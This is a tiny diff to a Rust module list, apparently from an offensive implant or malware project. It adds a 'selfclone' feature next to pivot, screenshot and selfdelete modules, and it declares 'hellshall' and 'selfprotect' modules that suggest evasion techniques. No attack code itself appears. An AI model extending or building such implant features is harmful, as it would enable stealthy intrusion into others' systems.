@@ -17,6 +17,7 @@ mod features {
     pub mod pivot;
     pub mod screenshot;
     pub mod selfdelete;
+    pub mod selfclone;
 }
 mod hellshall;
 mod selfprotect;
